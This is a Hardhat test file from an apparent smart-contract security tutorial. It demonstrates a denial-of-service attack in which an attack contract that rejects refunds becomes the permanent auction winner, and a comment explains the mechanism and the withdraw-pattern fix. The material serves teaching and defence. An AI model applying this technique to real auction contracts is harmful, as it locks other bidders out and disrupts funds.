const {expect} = require('chai');
const {ethers} = require('hardhat');


describe("Denial of Service", function() {
  it("After being declared as the winner, Attack.sol should not allow anyone else to bid", async function() {

// Deploy good contract
const Good = await ethers.getContractFactory('Good');
const goodContract = await Good.deploy();
await goodContract.deployed();
console.log("Good Contract Address:", goodContract.address);

// Deploy Attack Contract
const Attack = await ethers.getContractFactory('Attack');
const attackContract = await Attack.deploy(goodContract.address);
await attackContract.deployed();
console.log("Attack Contract Address:", attackContract.address);

// Now let's attack the good contract
// Get two addresses

const[_, addr1, addr2] = await ethers.getSigners();

// Initially let addr1 become the current winner of the auction

let tx = await goodContract.connect(addr1).setCurrentAuctionPrice({
        value: ethers.utils.parseEther('1'), 
        })

await tx.wait();

// Start the attack and make Attack.sol the current winner of the auction
tx = await attackContract.attack({
      value: ethers.utils.parseEther('2'),
});

await tx.wait();

// Now let's trying making addr2 the highest bidder of the auction

tx = await goodContract.connect(addr2).setCurrentAuctionPrice({
      value: ethers.utils.parseEther('3'),
});

await tx.wait();

// Now let's check if the current winner is still attack contract
expect(await goodContract.currentWinner()).to.equal(attackContract.address); 

  });
});

/***
 * Breaking down the DOS attack
 
 * Notice how Attack.sol will lead Good.sol into a DOS attack. 
 
 1. First addr1 will become the current winner by calling setCurrentAuctionPrice on Good.sol 
 
 2. then Attack.sol will become the current winner by sending more ETH than addr1 using the attack function. 
 
 3. Now when addr2 will try to become the new winner, 

 4 it won't be able to do that because of this check(if (sent)) present in the Good.sol contract 
  which verifies that the current winner should only be changed--- if the ETH is sent back to the previous current winner.

 5. Since Attack.sol doesn't have a fallback function which is necessary to accept ETH payments, 
    sent is always false and 
    thus the current winner is never updated and 
    addr2 or any other address can never become the current winner


 PREVETION:
 
 You can create a separate withdraw function for the previous winners - refer Better.sol

 */